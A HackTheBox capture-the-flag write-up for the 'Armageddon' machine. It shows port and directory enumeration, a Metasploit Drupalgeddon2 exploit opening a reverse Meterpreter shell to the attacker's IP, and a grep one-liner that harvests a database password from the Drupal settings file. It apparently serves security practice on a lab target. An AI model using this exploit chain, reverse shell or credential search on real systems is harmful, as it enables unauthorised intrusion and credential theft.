+++
title = "HackTheBox Write-up&mdash;Armageddon"
+++

This machine has IP 10.10.10.233.

Enumerate:
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 17:30 NZST
Nmap scan report for armageddon (10.10.10.233)
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.43 seconds
```

I go to `http://armageddon/` and find that I need to log in or create an account.  I don't yet know what for.

We use `ffuf` to find the subdirectories open to us:
```
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9]
includes                [Status: 301, Size: 235, Words: 14, Lines: 8]
misc                    [Status: 301, Size: 231, Words: 14, Lines: 8]
modules                 [Status: 301, Size: 234, Words: 14, Lines: 8]
profiles                [Status: 301, Size: 235, Words: 14, Lines: 8]
robots.txt              [Status: 200, Size: 2189, Words: 158, Lines: 91]
scripts                 [Status: 301, Size: 234, Words: 14, Lines: 8]
sites                   [Status: 301, Size: 232, Words: 14, Lines: 8]
themes                  [Status: 301, Size: 233, Words: 14, Lines: 8]
```

We note that in `/scripts` we see a `password-hash.sh` file.  This is actually some PHP code.

We also have a `/robots.txt` file, which looks pretty generic.

There is so much information here, I don't know where to start!  Some of the files I have tried to access cannot be accessed from the browser, so perhaps this is not the bes way in.  Well, we see from the `nmap` scan that the server is using Drupal 7.  Let's have a look to see if there are any exploits of that.  We use `searchsploit` and see quite a few...

We set LHOST to our own `tun0` or `utun2` IP, and RHOSTS to the machine's.
```
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.239
LHOST => 10.10.14.239

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
RHOSTS => 10.10.10.233

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
[*] Started reverse TCP handler on 10.10.14.239:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.239:4444 -> 10.10.10.233:43850) at 2021-04-12 18:15:20 +1200

meterpreter>
```

However, once we run anything on here, if it is left for too long, we get an error.
```
meterpreter > ls
[-] Session manipulation failed: Too many open files
```

Promptly, we run:
```
meterpreter > ls
Listing: /var/www/html
======================
...
```

Running `shell` and then `bash -i`, we gain access to a bash shell.

I wonder if there are any user information in this directory, or any subdirectories, so I run the following:
```
find sites/ -type f | while IFS= read -r F; do [[ -z "$(grep -i "password" "$F")" ]] || (echo "\n\n-------->$line" && grep -i "password" "$F"); done
```

This takes quite a bit of filtering through, but in `sites/default/settings.php`, I find this line:
```php
'password' => 'CQHEy@9M*m23gBVj'
```

The same file actually contains a username line:
```php
'username' => 'drupaluser',
```
